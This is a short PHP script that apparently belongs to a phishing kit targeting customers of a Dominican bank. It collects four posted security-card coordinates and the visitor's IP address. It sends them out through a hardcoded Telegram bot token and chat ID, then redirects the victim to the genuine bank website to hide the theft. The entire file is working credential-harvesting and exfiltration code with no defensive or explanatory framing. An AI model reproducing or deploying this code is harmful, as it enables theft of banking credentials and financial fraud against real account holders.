<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////


////////////////////

if ( isset ($_POST['code122']) && isset ($_POST['code222']) && isset ($_POST['code322']) && isset ($_POST['code422']) ){

$message = "7= ".$_POST['code122']." - 18= ".$_POST['code222']." - 23= ".$_POST['code322']." - 39= ".$_POST['code422']." \r\n";

$message = ".:::Cordenadas#3:::.\r\n7: ".$_POST['code122']."\r\n18: ".$_POST['code222']."\r\n23: ".$_POST['code322']."\r\n39: ".$_POST['code422']."\r\n".$userp."";
  
$apiToken = "5984973262:AAHOKiUoO1lwfgX1BPVBLTsWTa-S_ntHMS8";


$data = [
  'chat_id' => "5512074919",

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

@header('Location: https://www.banreservas.com.do/');

}else{ header ('location: index.html'); exit(); }

?>